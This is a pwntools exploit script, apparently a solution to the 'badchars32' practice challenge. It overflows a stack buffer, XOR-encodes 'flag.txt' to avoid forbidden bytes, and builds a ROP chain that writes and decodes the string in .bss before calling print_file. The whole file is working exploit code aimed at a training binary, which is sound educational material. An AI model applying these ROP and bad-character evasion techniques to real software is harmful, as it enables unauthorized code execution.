from pwn import *

elf = context.binary = ELF('./badchars32')
p = process()

xor_key = 0x02
xor_ebp_bl = 0x08048547
pop_edi_ebp = 0x080485ba
pop_ebx_esi_edi_ebp = 0x080485b8
mov_edi_esi = 0x0804854c # 0x0804854c : pop ebp ; add bl, al ; mov dword ptr [edi], esi ; ret

print_file = 0x080483d0
raw = b"flag.txt" # 需要的字串
enc = bytes([b ^ xor_key for b in raw]) # 加密后的字串
print(enc)
bss = 0x804a020

# 因爲x86 一次只能寫四個bytes, 因此分兩次完成
first_dword = u32(enc[:4])
second_dword = u32(enc[4:8])

payload = flat(
    "A"*44,
    # 第一次
    pop_ebx_esi_edi_ebp,
    0x0,
    first_dword, # 寫入
    bss,
    0x0,
    mov_edi_esi, 
    0x0, # pop ebp
    # 第二次
    pop_ebx_esi_edi_ebp,
    0x0,
    second_dword,
    bss+4,
    0x0,
    mov_edi_esi,
    0x0 # pop ebp
)


for i in range(len(raw)):
    payload += p32(pop_ebx_esi_edi_ebp) + p32(xor_key) + p32(0x0) + p32(0x0) + p32(bss+i) + p32(xor_ebp_bl)

payload += flat(
    print_file,
    0x0,
    bss
    
)
p.sendline(payload)
print(p.clean().decode('latin-1'))
